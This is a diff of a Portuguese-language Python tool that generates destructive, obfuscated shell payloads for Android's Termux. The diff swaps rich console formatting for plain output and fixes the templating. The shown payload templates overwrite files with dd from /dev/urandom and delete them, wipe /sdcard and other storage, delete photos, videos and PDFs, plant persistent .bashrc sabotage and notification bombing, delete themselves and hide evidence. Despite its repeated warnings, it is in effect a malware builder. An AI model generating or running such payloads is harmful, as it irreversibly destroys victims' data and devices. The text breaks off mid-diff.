@@ -7,26 +7,9 @@ import time
 import random
 import base64
 import zlib
-import platform
 import hashlib
 import json
-from typing import Dict, List, Optional
-
-# Interface colorida no terminal
-from rich.console import Console
-from rich.panel import Panel
-from rich.table import Table
-from rich.prompt import Prompt, Confirm, IntPrompt
-from rich.progress import Progress
-from rich.text import Text
-from rich.syntax import Syntax
-
-# Realce de código no terminal
-import pygments
-from pygments.lexers import BashLexer
-from pygments.formatters import TerminalFormatter
-
-console = Console()
+from typing import Dict, List, Optional, Callable
 
 class GeradorDestrutivoTermux:
     def __init__(self):
@@ -92,7 +75,6 @@ class GeradorDestrutivoTermux:
         
     def _gerar_banner_skull(self) -> str:
         return """
-[bold red]
     ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ 
    ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
    ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌
@@ -104,13 +86,11 @@ class GeradorDestrutivoTermux:
    ▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌
    ▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌
     ▀            ▀         ▀  ▀         ▀  ▀         ▀ 
-[/bold red]
-[bold white on red]    GERADOR DE SCRIPTS DESTRUTIVOS TERMUX - USE COM CUIDADO![/bold white on red]
+    GERADOR DE SCRIPTS DESTRUTIVOS TERMUX - USE COM CUIDADO!
 """
     
     def _gerar_banner_warning(self) -> str:
         return """
-[bold yellow]
 ╔══════════════════════════════════════════════════════════════╗
 ║                                                              ║
 ║  ██╗    ██╗ █████╗ ██████╗ ██╗███╗   ██╗ ██████╗            ║
@@ -128,12 +108,10 @@ class GeradorDestrutivoTermux:
 ║  ╚═╝      ╚═════╝ ╚══════╝    ╚══════╝╚═╝  ╚═╝╚══════╝╚═════╝║
 ║                                                              ║
 ╚══════════════════════════════════════════════════════════════╝
-[/bold yellow]
 """
     
     def _gerar_banner_nuke(self) -> str:
         return """
-[bold red]
                          ____
                  __,-~~/~    `---.
                _/_,---(      ,    )
@@ -147,61 +125,44 @@ class GeradorDestrutivoTermux:
                      <|i::|i|`.
                     (` ^'"`-' ")
 ---------------------------------------------------------
-[/bold red]
-[bold white on red]        DESTRUIÇÃO NUCLEAR PARA TERMUX - DANOS IRREVERSÍVEIS![/bold white on red]
+        DESTRUIÇÃO NUCLEAR PARA TERMUX - DANOS IRREVERSÍVEIS!
 """
     
     def mostrar_banner(self):
-        console.print(random.choice(self.banners))
-        console.print(Panel.fit(
-            "[blink bold red]☠️  PERIGO EXTREMO! DANOS PERMANENTES NO DISPOSITIVO! ☠️[/blink bold red]\n"
-            "⚠️  ESTES SCRIPTS PODEM: \n"
-            "   • APAGAR TODOS OS SEUS DADOS\n"
-            "   • DANIFICAR PERMANENTEMENTE SEU CELULAR\n"
-            "   • DEIXAR SEU TERMUX INUTILIZÁVEL\n"
-            "⚠️  USE APENAS PARA TESTES EM AMBIENTES CONTROLADOS!",
-            style="red on black"
-        ))
+        print("\033[1;31m" + random.choice(self.banners) + "\033[0m")
+        print("\033[1;41m PERIGO EXTREMO! DANOS PERMANENTES NO DISPOSITIVO! \033[0m")
+        print("⚠️  ESTES SCRIPTS PODEM: ")
+        print("   • APAGAR TODOS OS SEUS DADOS")
+        print("   • DANIFICAR PERMANENTEMENTE SEU CELULAR")
+        print("   • DEIXAR SEU TERMUX INUTILIZÁVEL")
+        print("⚠️  USE APENAS PARA TESTES EM AMBIENTES CONTROLADOS!")
+        print("\033[1;41m" + "="*60 + "\033[0m")
         time.sleep(2)
         
         # Confirmação extra de segurança
-        if not Confirm.ask("[blink red]⚡ VOCÊ REALMENTE ENTENDE OS RISCOS?[/blink red]", default=False):
-            console.print("[green]Saindo com segurança...[/green]")
+        resposta = input("\033[1;31m⚡ VOCÊ REALMENTE ENTENDE OS RISCOS? (s/N): \033[0m").lower()
+        if resposta != 's':
+            print("\033[1;32mSaindo com segurança...\033[0m")
             sys.exit(0)
+    
+    def limpar_tela(self):
+        os.system('cls' if os.name == 'nt' else 'clear')
     
     def mostrar_menu_principal(self):
         while True:
-            console.clear()
+            self.limpar_tela()
             self.mostrar_banner()
             
-            tabela = Table(
-                title="[bold cyan]💀 MENU DE DESTRUIÇÃO TERMUX[/bold cyan]",
-                show_header=True,
-                header_style="bold magenta"
-            )
-            tabela.add_column("Opção", style="cyan", width=10)
-            tabela.add_column("Categoria", style="green")
-            tabela.add_column("Perigo", style="red")
-            tabela.add_column("Descrição")
+            print("\033[1;36m💀 MENU DE DESTRUIÇÃO TERMUX\033[0m")
+            print("=" * 50)
+            print("\033[1;36m1\033[0m - Destrutivos \033[1;31m💀 CRÍTICO\033[0m - Reformatação e exclusão de dados")
+            print("\033[1;36m2\033[0m - Irritantes \033[1;33m🔥 ALTO\033[0m - Sabotagem e irritação persistente")
+            print("\033[1;36m3\033[0m - Combo \033[1;31m☠️ NUCLEAR\033[0m - Destruição completa + irritação")
+            print("\033[1;36m0\033[0m - Configurações \033[1;34m⚙️\033[0m - Opções de ofuscação")
+            print("\033[1;36m9\033[0m - Sair \033[1;32m🚪\033[0m - Sair do programa")
+            print("=" * 50)
             
-            opcoes = [
-                ("1", "Destrutivos", "💀 CRÍTICO", "Reformatação e exclusão de dados"),
-                ("2", "Irritantes", "🔥 ALTO", "Sabotagem e irritação persistente"),
-                ("3", "Combo", "☠️ NUCLEAR", "Destruição completa + irritação"),
-                ("0", "Configurações", "⚙️", "Opções de ofuscação"),
-                ("9", "Sair", "🚪", "Sair do programa")
-            ]
-            
-            for opcao, categoria, perigo, descricao in opcoes:
-                tabela.add_row(opcao, categoria, perigo, descricao)
-            
-            console.print(tabela)
-            
-            escolha = Prompt.ask(
-                "[blink yellow]➤[/blink yellow] Selecione sua arma",
-                choices=["0", "1", "2", "3", "9"],
-                show_choices=False
-            )
+            escolha = input("\033[1;33m➤ Selecione sua arma: \033[0m")
             
             if escolha == "1":
                 self._mostrar_submenu('Destrutivos')
@@ -213,86 +174,79 @@ class GeradorDestrutivoTermux:
                 self._mostrar_menu_configuracao()
             elif escolha == "9":
                 self._sair()
+            else:
+                print("\033[1;31mOpção inválida! Tente novamente.\033[0m")
+                time.sleep(1)
     
     def _mostrar_submenu(self, categoria: str):
         payloads_categoria = {k: v for k, v in self.payloads.items() if v['category'] == categoria}
         
         while True:
-            console.clear()
+            self.limpar_tela()
             
             if categoria == 'Destrutivos':
-                titulo = f"[blink bold red]☠️ {categoria.upper()} ☠️[/blink bold red]"
-                estilo = "red"
+                titulo = f"☠️ {categoria.upper()} ☠️"
+                estilo_titulo = "\033[1;31m"
             elif categoria == 'Irritantes':
-                titulo = f"[blink bold yellow]🔥 {categoria.upper()} 🔥[/blink bold yellow]"
-                estilo = "yellow"
+                titulo = f"🔥 {categoria.upper()} 🔥"
+                estilo_titulo = "\033[1;33m"
             else:
-                titulo = f"[blink bold white on red]💣 {categoria.upper()} 💣[/blink bold white on red]"
-                estilo = "red on white"
+                titulo = f"💣 {categoria.upper()} 💣"
+                estilo_titulo = "\033[1;41m"
             
-            tabela = Table(
-                title=titulo,
-                show_header=True,
-                header_style=f"bold {estilo}"
-            )
-            tabela.add_column("ID", style="cyan", width=5)
-            tabela.add_column("Nome", style="green")
-            tabela.add_column("Descrição")
-            tabela.add_column("Perigo", style="red")
+            print(f"{estilo_titulo}{titulo}\033[0m")
+            print("=" * 50)
             
+            opcoes = []
             for i, (nome, dados) in enumerate(payloads_categoria.items(), 1):
                 icone_perigo = {
                     'medium': '⚠️',
                     'high': '🔥',
                     'critical': '💀'
                 }.get(dados['danger_level'], '')
-                tabela.add_row(
-                    str(i),
-                    nome,
-                    dados['description'],
-                    f"{icone_perigo} {dados['danger_level'].upper()}"
-                )
+                
+                print(f"\033[1;36m{i}\033[0m - {nome} - {dados['description']} {icone_perigo} {dados['danger_level'].upper()}")
+                opcoes.append(str(i))
             
-            tabela.add_row("0", "Voltar", "Retornar ao menu principal", "↩️")
-            console.print(tabela)
+            print("\033[1;36m0\033[0m - Voltar ↩️")
+            print("=" * 50)
             
-            escolha = Prompt.ask(
-                "[blink yellow]➤[/blink yellow] Selecione o payload",
-                choices=[str(i) for i in range(0, len(payloads_categoria)+1)],
-                show_choices=False
-            )
+            escolha = input("\033[1;33m➤ Selecione o payload: \033[0m")
             
             if escolha == "0":
                 return
             
-            nome_payload = list(payloads_categoria.keys())[int(escolha)-1]
-            self._processar_payload(nome_payload)
+            if escolha in opcoes:
+                nome_payload = list(payloads_categoria.keys())[int(escolha)-1]
+                self._processar_payload(nome_payload)
+            else:
+                print("\033[1;31mOpção inválida! Tente novamente.\033[0m")
+                time.sleep(1)
     
     def _processar_payload(self, nome_payload: str):
         payload_data = self.payloads[nome_payload]
         
         # Avisos extras para payloads críticos
         if payload_data['danger_level'] in ['high', 'critical']:
-            console.print(Panel.fit(
-                "[blink bold red]☠️  ALERTA MÁXIMO DE PERIGO! ☠️[/blink bold red]\n"
-                "Este script pode:\n"
-                "• Causar danos permanentes no dispositivo\n"
-                "• Apagar todos os seus dados irreversivelmente\n"
-                "• Deixar seu Termux/celular inutilizável\n"
-                "• Requer formatação completa para remover",
-                border_style="red"
-            ))
+            print("\033[1;41m☠️  ALERTA MÁXIMO DE PERIGO! ☠️\033[0m")
+            print("Este script pode:")
+            print("• Causar danos permanentes no dispositivo")
+            print("• Apagar todos os seus dados irreversivelmente")
+            print("• Deixar seu Termux/celular inutilizável")
+            print("• Requer formatação completa para remover")
+            print("\033[1;41m" + "="*60 + "\033[0m")
             
             # Confirmação tripla para payloads críticos
             confirmacoes = 0
             for i in range(3):
-                if Confirm.ask(f"[red]Confirmação {i+1}/3 - TEM CERTEZA ABSOLUTA?[/red]", default=False):
+                resposta = input(f"\033[1;31mConfirmação {i+1}/3 - TEM CERTEZA ABSOLUTA? (s/N): \033[0m").lower()
+                if resposta == 's':
                     confirmacoes += 1
                 else:
                     break
             
             if confirmacoes < 3:
-                console.print("[yellow]Cancelado por segurança...[/yellow]")
+                print("\033[1;33mCancelado por segurança...\033[0m")
                 time.sleep(2)
                 return
         
@@ -300,23 +254,19 @@ class GeradorDestrutivoTermux:
         if config is None:
             return
         
-        ofuscar = Confirm.ask("Aplicar técnicas avançadas de ofuscação?")
+        resposta = input("\033[1;33mAplicar técnicas avançadas de ofuscação? (s/N): \033[0m").lower()
+        ofuscar = (resposta == 's')
         tecnicas = []
         if ofuscar:
             tecnicas = self._selecionar_tecnicas_ofuscacao()
         
-        with Progress() as progress:
-            task = progress.add_task("[red]Gerando payload destrutivo...[/red]", total=100)
-            
-            payload = payload_data['function'](**config)
-            progress.update(task, advance=30)
-            
-            if ofuscar:
-                for tecnica in tecnicas:
-                    payload = self._ofuscar_avancado(payload, tecnica)
-                    progress.update(task, advance=10)
-            
-            progress.update(task, completed=100)
+        print("\033[1;31mGerando payload destrutivo...\033[0m")
+        
+        payload = payload_data['function'](**config)
+        
+        if ofuscar:
+            for tecnica in tecnicas:
+                payload = self._ofuscar_avancado(payload, tecnica)
         
         self._preview_payload(payload)
         self._salvar_payload(nome_payload, payload)
@@ -325,49 +275,59 @@ class GeradorDestrutivoTermux:
         config = {}
         
         if nome_payload == 'reformat_celular':
-            console.print(Panel.fit(
-                "[bold red]CONFIGURAÇÃO DE REFORMATAÇÃO[/bold red]",
-                border_style="red"
-            ))
-            config['apagar_sdcard'] = Confirm.ask("[yellow]?[/yellow] Apagar também SD Card?", default=False)
-            config['sobrescrever'] = Confirm.ask("[yellow]?[/yellow] Sobrescrever com dados aleatórios?", default=True)
+            print("\033[1;31mCONFIGURAÇÃO DE REFORMATAÇÃO\033[0m")
+            resposta = input("\033[1;33mApagar também SD Card? (s/N): \033[0m").lower()
+            config['apagar_sdcard'] = (resposta == 's')
+            resposta = input("\033[1;33mSobrescrever com dados aleatórios? (S/n): \033[0m").lower()
+            config['sobrescrever'] = (resposta != 'n')
         
         elif nome_payload == 'sabotagem_termux':
-            console.print(Panel.fit(
-                "[bold yellow]CONFIGURAÇÃO DE SABOTAGEM[/bold yellow]",
-                border_style="yellow"
-            ))
-            config['nivel_irritacao'] = IntPrompt.ask(
-                "[yellow]?[/yellow] Nível de irritação (1-10)",
-                default=7,
-                choices=[str(i) for i in range(1, 11)]
-            )
-            config['persistencia'] = Confirm.ask("[yellow]?[/yellow] Tornar persistente?", default=True)
+            print("\033[1;33mCONFIGURAÇÃO DE SABOTAGEM\033[0m")
+            while True:
+                try:
+                    nivel = int(input("\033[1;33mNível de irritação (1-10, padrão 7): \033[0m") or "7")
+                    if 1 <= nivel <= 10:
+                        config['nivel_irritacao'] = nivel
+                        break
+                    else:
+                        print("\033[1;31mDigite um valor entre 1 e 10!\033[0m")
+                except ValueError:
+                    print("\033[1;31mDigite um número válido!\033[0m")
+            
+            resposta = input("\033[1;33mTornar persistente? (S/n): \033[0m").lower()
+            config['persistencia'] = (resposta != 'n')
         
         elif nome_payload == 'troll_completo':
-            console.print(Panel.fit(
-                "[bold white on red]CONFIGURAÇÃO DO COMBO COMPLETO[/bold white on red]",
-                border_style="red"
-            ))
-            config['incluir_destrutivo'] = Confirm.ask("[yellow]?[/yellow] Incluir destruição?", default=True)
-            config['incluir_irritante'] = Confirm.ask("[yellow]?[/yellow] Incluir irritação?", default=True)
-            config['delay_inicio'] = IntPrompt.ask("[yellow]?[/yellow] Delay antes de iniciar (minutos)", default=5)
+            print("\033[1;41mCONFIGURAÇÃO DO COMBO COMPLETO\033[0m")
+            resposta = input("\033[1;33mIncluir destruição? (S/n): \033[0m").lower()
+            config['incluir_destrutivo'] = (resposta != 'n')
+            resposta = input("\033[1;33mIncluir irritação? (S/n): \033[0m").lower()
+            config['incluir_irritante'] = (resposta != 'n')
+            
+            while True:
+                try:
+                    delay = int(input("\033[1;33mDelay antes de iniciar (minutos, padrão 5): \033[0m") or "5")
+                    if delay >= 0:
+                        config['delay_inicio'] = delay
+                        break
+                    else:
+                        print("\033[1;31mDigite um valor positivo!\033[0m")
+                except ValueError:
+                    print("\033[1;31mDigite um número válido!\033[0m")
         
-        console.print("\n[bold]Resumo da configuração:[/bold]")
+        print("\n\033[1mResumo da configuração:\033[0m")
         for chave, valor in config.items():
-            console.print(f"  [cyan]{chave}:[/cyan] {valor}")
+            print(f"  \033[1;36m{chave}:\033[0m {valor}")
         
-        if not Confirm.ask("[red]Confirmar estas configurações?[/red]"):
+        resposta = input("\n\033[1;31mConfirmar estas configurações? (s/N): \033[0m").lower()
+        if resposta != 's':
             return None
         
         return config
     
     def _selecionar_tecnicas_ofuscacao(self) -> List[str]:
-        console.print("\n[bold]Técnicas de ofuscação disponíveis:[/bold]")
-        tabela = Table(show_header=True, header_style="bold magenta")
-        tabela.add_column("ID", style="cyan", width=5)
-        tabela.add_column("Técnica", style="green")
-        tabela.add_column("Dificuldade", style="yellow")
+        print("\n\033[1mTécnicas de ofuscação disponíveis:\033[0m")
+        print("=" * 50)
         
         tecnicas_info = {
             'base64': "Fácil",
@@ -378,46 +338,44 @@ class GeradorDestrutivoTermux:
             'function_split': "Avançada"
         }
         
-        for i, (codigo, desc) in enumerate(self.tecnicas_ofuscacao.items(), 1):
-            tabela.add_row(str(i), desc, tecnicas_info.get(codigo, "Média"))
+        tecnicas_lista = list(self.tecnicas_ofuscacao.items())
+        for i, (codigo, desc) in enumerate(tecnicas_lista, 1):
+            dificuldade = tecnicas_info.get(codigo, "Média")
+            print(f"\033[1;36m{i}\033[0m - {desc} - \033[1;33m{dificuldade}\033[0m")
         
-        console.print(tabela)
+        print("=" * 50)
         
-        escolhas = Prompt.ask(
-            "[yellow]?[/yellow] Selecione técnicas (separadas por vírgula)",
-            default="1,2,4"
-        )
+        escolhas = input("\033[1;33mSelecione técnicas (separadas por vírgula, padrão 1,2,4): \033[0m") or "1,2,4"
         
-        return [list(self.tecnicas_ofuscacao.keys())[int(x)-1] for x in escolhas.split(',')]
+        try:
+            indices = [int(x.strip()) for x in escolhas.split(',')]
+            return [tecnicas_lista[i-1][0] for i in indices if 1 <= i <= len(tecnicas_lista)]
+        except ValueError:
+            print("\033[1;31mSeleção inválida! Usando padrão.\033[0m")
+            return ['base64', 'gzip', 'variable_obfuscation']
     
     def _preview_payload(self, payload: str):
-        console.print(Panel.fit(
-            "[bold yellow]PRÉ-VISUALIZAÇÃO DO PAYLOAD[/bold yellow]",
-            border_style="yellow"
-        ))
+        print("\033[1;33mPRÉ-VISUALIZAÇÃO DO PAYLOAD\033[0m")
+        print("=" * 50)
         
         # Mostrar apenas as primeiras linhas para preview
         lines = payload.split('\n')[:20]
-        code = '\n'.join(lines)
-        
-        try:
-            lexer = BashLexer()
-            formatter = TerminalFormatter()
-            highlighted = pygments.highlight(code, lexer, formatter)
-            console.print(highlighted)
-        except:
-            console.print(code)
+        for line in lines:
+            if line.strip().startswith('#') or line.strip().startswith('echo'):
+                print(f"\033[1;32m{line}\033[0m")
+            elif 'rm' in line or 'shred' in line or 'dd' in line:
+                print(f"\033[1;31m{line}\033[0m")
+            else:
+                print(f"\033[1;37m{line}\033[0m")
         
         if len(payload.split('\n')) > 20:
-            console.print("[yellow]... (script truncado para preview)[/yellow]")
+            print("\033[1;33m... (script truncado para preview)\033[0m")
         
-        console.print(f"\n[cyan]Tamanho total: {len(payload)} caracteres, {len(payload.splitlines())} linhas[/cyan]")
+        print(f"\n\033[1;36mTamanho total: {len(payload)} caracteres, {len(payload.splitlines())} linhas\033[0m")
+        print("=" * 50)
     
     def _salvar_payload(self, nome_payload: str, payload: str):
-        nome_arquivo = Prompt.ask(
-            "[yellow]?[/yellow] Nome do arquivo de saída",
-            default=f"termux_destruct_{nome_payload}.sh"
-        )
+        nome_arquivo = input("\033[1;33mNome do arquivo de saída: \033[0m") or f"termux_destruct_{nome_payload}.sh"
         
         try:
             with open(nome_arquivo, 'w', encoding='utf-8') as f:
@@ -435,52 +393,34 @@ class GeradorDestrutivoTermux:
                 md5 = hashlib.md5(content).hexdigest()
                 sha256 = hashlib.sha256(content).hexdigest()
             
-            console.print(Panel.fit(
-                f"[green]✓ Script salvo como [bold]{nome_arquivo}[/bold][/green]\n"
-                f"[cyan]MD5: [bold]{md5}[/bold][/cyan]\n"
-                f"[cyan]SHA256: [bold]{sha256}[/bold][/cyan]\n"
-                f"[yellow]Execute com extremo cuidado:[/yellow]\n"
-                f"[bold white]bash {nome_arquivo}[/bold white]",
-                title="[bold green]SCRIPT GERADO[/bold green]",
-                border_style="green"
-            ))
+            print("\033[1;42m SCRIPT GERADO \033[0m")
+            print(f"\033[1;32m✓ Script salvo como \033[1;37m{nome_arquivo}\033[0m")
+            print(f"\033[1;36mMD5: \033[1;37m{md5}\033[0m")
+            print(f"\033[1;36mSHA256: \033[1;37m{sha256}\033[0m")
+            print(f"\033[1;33mExecute com extremo cuidado:\033[0m")
+            print(f"\033[1;37mbash {nome_arquivo}\033[0m")
             
             # Aviso final
-            console.print(Panel.fit(
-                "[blink bold red]⚠️  AVISO FINAL! ⚠️[/blink bold red]\n"
-                "Este script pode causar danos irreversíveis!\n"
-                "Execute apenas em ambientes de teste controlados!",
-                border_style="red"
-            ))
+            print("\033[1;41m⚠️  AVISO FINAL! ⚠️\033[0m")
+            print("Este script pode causar danos irreversíveis!")
+            print("Execute apenas em ambientes de teste controlados!")
             
         except Exception as e:
-            console.print(Panel.fit(
-                f"[red]✗ Erro ao salvar: {str(e)}[/red]",
-                title="[bold red]ERRO[/bold red]",
-                border_style="red"
-            ))
+            print(f"\033[1;41m✗ Erro ao salvar: {str(e)}\033[0m")
         
         input("\nPressione Enter para continuar...")
     
     def _mostrar_menu_configuracao(self):
         while True:
-            console.clear()
-            console.print(Panel.fit(
-                "[bold cyan]⚙️ CONFIGURAÇÕES DE OFUSCAÇÃO[/bold cyan]",
-                border_style="cyan"
-            ))
+            self.limpar_tela()
+            print("\033[1;36m⚙️ CONFIGURAÇÕES DE OFUSCAÇÃO\033[0m")
+            print("=" * 50)
+            print("\033[1;36m1\033[0m - Testar técnicas de ofuscação")
+            print("\033[1;36m2\033[0m - Visualizar payloads sample")
+            print("\033[1;36m0\033[0m - Voltar")
+            print("=" * 50)
             
-            tabela = Table(show_header=False)
-            tabela.add_row("1", "Testar técnicas de ofuscação")
-            tabela.add_row("2", "Visualizar payloads sample")
-            tabela.add_row("0", "Voltar")
-            console.print(tabela)
-            
-            escolha = Prompt.ask(
-                "[blink yellow]➤[/blink yellow] Selecione",
-                choices=["0", "1", "2"],
-                show_choices=False
-            )
+            escolha = input("\033[1;33m➤ Selecione: \033[0m")
             
             if escolha == "1":
                 self._testar_ofuscacao()
@@ -488,35 +428,29 @@ class GeradorDestrutivoTermux:
                 self._visualizar_payloads_sample()
             elif escolha == "0":
                 return
+            else:
+                print("\033[1;31mOpção inválida! Tente novamente.\033[0m")
+                time.sleep(1)
     
     def _testar_ofuscacao(self):
-        console.clear()
+        self.limpar_tela()
         codigo_teste = "echo 'Teste de ofuscação'; sleep 1"
         
-        console.print(Panel.fit(
-            "[bold]TESTE DE TÉCNICAS DE OFUSCAÇÃO[/bold]",
-            border_style="yellow"
-        ))
-        
-        tabela = Table(title="Técnicas Disponíveis", show_header=True, header_style="bold magenta")
-        tabela.add_column("ID", style="cyan")
-        tabela.add_column("Técnica")
-        tabela.add_column("Exemplo")
+        print("\033[1;33mTESTE DE TÉCNICAS DE OFUSCAÇÃO\033[0m")
+        print("=" * 50)
         
         for i, (codigo, desc) in enumerate(self.tecnicas_ofuscacao.items(), 1):
             exemplo = self._ofuscar_avancado(codigo_teste, codigo)
-            tabela.add_row(str(i), desc, exemplo[:50] + "..." if len(exemplo) > 50 else exemplo)
-        
-        console.print(tabela)
+            print(f"\033[1;36m{i}. {desc}:\033[0m")
+            print(f"\033[1;37m{exemplo[:100]}{'...' if len(exemplo) > 100 else ''}\033[0m")
+            print()
         
         input("\nPressione Enter para voltar...")
     
     def _visualizar_payloads_sample(self):
-        console.clear()
-        console.print(Panel.fit(
-            "[bold]AMOSTRAS DE PAYLOADS[/bold]",
-            border_style="blue"
-        ))
+        self.limpar_tela()
+        print("\033[1;34mAMOSTRAS DE PAYLOADS\033[0m")
+        print("=" * 50)
         
         # Amostra de cada tipo de payload
         samples = {
@@ -526,11 +460,12 @@ class GeradorDestrutivoTermux:
         }
         
         for categoria, sample in samples.items():
-            console.print(Panel.fit(
-                f"[bold]{categoria}[/bold]\n" + "\n".join(sample.split('\n')[:10]),
-                border_style="yellow"
-            ))
-            console.print()
+            print(f"\033[1;33m{categoria}:\033[0m")
+            lines = sample.split('\n')[:10]
+            for line in lines:
+                print(f"\033[1;37m{line}\033[0m")
+            print("..." if len(sample.split('\n')) > 10 else "")
+            print()
         
         input("\nPressione Enter para voltar...")
     
@@ -613,7 +548,7 @@ class GeradorDestrutivoTermux:
 # ⚠️  REFORMATAÇÃO COMPLETA DO DISPOSITIVO ⚠️
 # 💀 ESTE SCRIPT APAGARÁ TUDO NO SEU CELULAR 💀
 
-echo "[bold red]INICIANDO REFORMATAÇÃO...[/bold red]"
+echo "INICIANDO REFORMATAÇÃO..."
 sleep 3
 
 # Função para destruição segura
@@ -621,7 +556,7 @@ destruir_dados() {{
     local arquivo="$1"
     if [ -f "$arquivo" ] || [ -d "$arquivo" ]; then
         echo "Destruindo: $arquivo"
-        if [ "{sobrescrever}" = "true" ]; then
+        if [ "{'true' if sobrescrever else 'false'}" = "true" ]; then
             # Sobrescrever com dados aleatórios antes de apagar
             dd if=/dev/urandom of="$arquivo" bs=1M count=10 2>/dev/null
         fi
@@ -639,7 +574,7 @@ for dir in /data/data/com.termux/files/home /sdcard /storage/emulated/0; do
 done
 
 # Apagar SD Card se solicitado
-if [ "{apagar_sdcard}" = "true" ]; then
+if [ "{'true' if apagar_sdcard else 'false'}" = "true" ]; then
     echo "💀 APAGANDO SD CARD..."
     for sd_dir in /storage/* /mnt/*; do
         if [ -d "$sd_dir" ] && [ "$sd_dir" != "/storage/emulated" ]; then
@@ -682,8 +617,8 @@ fi
 
 # Mensagem final de destruição
 echo " "
-echo "[bold white on red]💀 REFORMATAÇÃO COMPLETA! SEU DISPOSITIVO PODE ESTAR INUTILIZÁVEL! 💀[/bold white on red]"
-echo "[bold red]Tudo foi apagado. Reinicie o dispositivo para ver os danos completos.[/bold red]"
+echo "💀 REFORMATAÇÃO COMPLETA! SEU DISPOSITIVO PODE ESTAR INUTILIZÁVEL! 💀"
+echo "Tudo foi apagado. Reinicie o dispositivo para ver os danos completos."
 
 # Auto-destruição do script
 rm -f "$0"
@@ -698,7 +633,7 @@ exit 0
 # 🔥 SABOTAGEM DO TERMUX - NÍVEL {irritacao_level}/10 🔥
 # 😠 Este script tornará seu Termux extremamente irritante! 😠
 
-echo "[yellow]Iniciando sabotagem do Termux...[/yellow]"
+echo "Iniciando sabotagem do Termux..."
 sleep 2
 
 # Funções de irritação
@@ -742,7 +677,7 @@ irritacao_alta() {{
     echo 'random_message' >> ~/.bashrc
     
     # Teclas trocadas aleatoriamente
-    echo 'function swap_keys() {' >> ~/.bashrc
+    echo 'function swap_keys() {{' >> ~/.bashrc
     echo '  case $((RANDOM % 10)) in' >> ~/.bashrc
     echo '    0) export INPUTCHARS="aoeui";;' >> ~/.bashrc
     echo '    1) export INPUTCHARS="sdfgh";;' >> ~/.bashrc
@@ -785,8 +720,8 @@ if [ {irritacao_level} -ge 9 ]; then
 fi
 
 # Persistência avançada
-if [ "{persistencia}" = "true" ]; then
-    echo "[yellow]Instalando persistência...[/yellow]"
+if [ "{'true' if persistencia else 'false'}" = "true" ]; then
+    echo "Instalando persistência..."
     
     # Múltiplos métodos de persistência
     echo 'source ~/.bashrc' >> ~/.bash_profile
@@ -817,8 +752,8 @@ PARA REMOVER A SABOTAGEM:
 EOF
 
 echo " "
-echo "[bold yellow]🔥 SABOTAGEM COMPLETA! Seu Termux agora está irritante! 🔥[/bold yellow]"
-echo "[yellow]Verifique o arquivo RESTAURAR_TERMUX.txt para instruções de remoção.[/yellow]"
+echo "🔥 SABOTAGEM COMPLETA! Seu Termux agora está irritante! 🔥"
+echo "Verifique o arquivo RESTAURAR_TERMUX.txt para instruções de remoção."
 
 # Esconder evidências
 sleep 3
@@ -833,7 +768,7 @@ exit 0
 # 💀 DESTRUIÇÃO DO ARMAZENAMENTO INTERNO 💀
 # ⚠️  Este script apagará TUDO no armazenamento interno!
 
-echo "[bold red]INICIANDO DESTRUIÇÃO DO ARMAZENAMENTO...[/bold red]"
+echo "INICIANDO DESTRUIÇÃO DO ARMAZENAMENTO..."
 sleep 3
 
 # Função de destruição segura com verificação
@@ -883,8 +818,8 @@ dd if=/dev/urandom of=/sdcard/junk.dat bs=1M count=100 2>/dev/null
 rm -f /sdcard/junk.dat
 
 echo " "
-echo "[bold white on red]💀 DESTRUIÇÃO COMPLETA! SEUS DADOS FORAM APAGADOS! 💀[/bold white on red]"
-echo "[red]Todos os arquivos pessoais foram destruídos irreversivelmente.[/red]"
+echo "💀 DESTRUIÇÃO COMPLETA! SEUS DADOS FORAM APAGADOS! 💀"
+echo "Todos os arquivos pessoais foram destruídos irreversivelmente."
 
 # Auto-destruição
 rm -f "$0"
@@ -897,11 +832,11 @@ exit 0
 # 🔔 BOMBARDEIO DE NOTIFICAÇÕES 🔔
 # 📱 Este script enviará notificações incessantes!
 
-echo "[yellow]Preparando bombardeio de notificações...[/yellow]"
+echo "Preparando bombardeio de notificações..."
 
 # Verificar se termux-api está instalado
 if ! command -v termux-notification &> /dev/null; then
-    echo "[red]Termux-API não instalado! Instale com: pkg install termux-api[/red]"
+    echo "Termux-API não instalado! Instale com: pkg install termux-api"
     exit 1
 fi
 
@@ -953,8 +888,8 @@ EOF
 chmod +x ~/.bombardeio
 
 echo " "
-echo "[bold yellow]🔔 BOMBARDEIO INICIADO! Notificações serão enviadas constantemente! 🔔[/bold yellow]"
-echo "[yellow]Reinicie o Termux para ver o efeito completo.[/yellow]"
+echo "🔔 BOMBARDEIO INICIADO! Notificações serão enviadas constantemente! 🔔"
+echo "Reinicie o Termux para ver o efeito completo."
 
 exit 0
 """
@@ -964,17 +899,17 @@ exit 0
 # 💣 TROLL COMPLETO - DESTRUIÇÃO + IRRITAÇÃO 💣
 # ☠️  Este script é a combinação mortal de todos os outros! ☠️
 
-echo "[bold red]INICIANDO TROLL COMPLETO EM {delay_inicio} MINUTOS...[/bold red]"
-echo "[red]Seu dispositivo será destruído e irritado simultaneamente![/red]"
+echo "INICIANDO TROLL COMPLETO EM {delay_inicio} MINUTOS..."
+echo "Seu dispositivo será destruído e irritado simultaneamente!"
 sleep 2
 
 # Delay antes de iniciar
-echo "[yellow]O bombardeio começará em {delay_inicio} minutos...[/yellow]"
+echo "O bombardeio começará em {delay_inicio} minutos..."
 sleep {delay_inicio * 60}
 
 # Parte destrutiva (se habilitada)
-if [ "{incluir_destrutivo}" = "true" ]; then
-    echo "[bold red]INICIANDO FASE DE DESTRUIÇÃO...[/bold red]"
+if [ "{'true' if incluir_destrutivo else 'false'}" = "true" ]; then
+    echo "INICIANDO FASE DE DESTRUIÇÃO..."
     
     # Apagar arquivos pessoais
     find /sdcard /storage/emulated/0 -name "*.jpg" -o -name "*.mp4" -o -name "*.pdf" -delete 2>/dev/null &
@@ -991,8 +926,8 @@ if [ "{incluir_destrutivo}" = "true" ]; then
 fi
 
 # Parte irritante (se habilitada)
-if [ "{incluir_irritante}" = "true" ]; then
